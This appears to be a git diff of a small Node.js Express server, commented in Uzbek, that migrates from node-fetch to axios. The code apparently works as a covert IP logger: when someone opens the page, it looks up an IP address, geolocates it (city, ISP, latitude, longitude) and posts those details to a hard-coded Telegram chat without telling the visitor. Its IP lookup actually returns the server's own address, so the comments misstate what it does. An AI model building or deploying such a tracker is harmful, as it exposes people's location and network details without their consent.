@@ -1,5 +1,5 @@
 const express = require('express');
-const fetch = require('node-fetch');
+const axios = require('axios');
 const app = express();
 
 // Telegram bot token va chat ID
@@ -10,15 +10,13 @@ const chatId = '1271713912';  // Siz yuborishni xohlagan chat ID yoki botning us
 app.get('/', async (req, res) => {
     try {
         // ipify.org API orqali IP manzilini olish
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        const ip = data.ip;  // IP manzili
+        const response = await axios.get('https://api.ipify.org?format=json');
+        const ip = response.data.ip;  // IP manzili
         console.log(`Foydalanuvchining IP manzili: ${ip}`);
 
         // IP manziliga asoslangan qo'shimcha ma'lumotlarni olish
-        const geoResponse = await fetch(`http://ip-api.com/json/${ip}`);
-        const geoData = await geoResponse.json();
-        const { city, regionName, country, isp, lat, lon } = geoData;
+        const geoResponse = await axios.get(`http://ip-api.com/json/${ip}`);
+        const { city, regionName, country, isp, lat, lon } = geoResponse.data;
 
         // Natijani foydalanuvchiga yuborish
         const message = `
@@ -29,17 +27,13 @@ app.get('/', async (req, res) => {
             ISP: ${isp}
             Kenglik: ${lat}
             Uzunlik: ${lon}
-            Google Maps Link: https://www.google.com/maps?q=${lat},${lon}
+            
         `;
-
+        
         // Telegramga yuborish
-        await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
-            method: 'POST',
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message
-            }),
-            headers: { 'Content-Type': 'application/json' }
+        await axios.post(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+            chat_id: chatId,
+            text: message
         });
 
         // Foydalanuvchiga javob qaytarish
@@ -53,7 +47,7 @@ app.get('/', async (req, res) => {
 });
 
 // Serverni ishga tushirish
-const port = 8080;
+const port = process.env.PORT || 3000;  // Hostingda portni avtomatik oladi
 app.listen(port, () => {
     console.log(`Server http://localhost:${port} da ishlamoqda...`);
 });
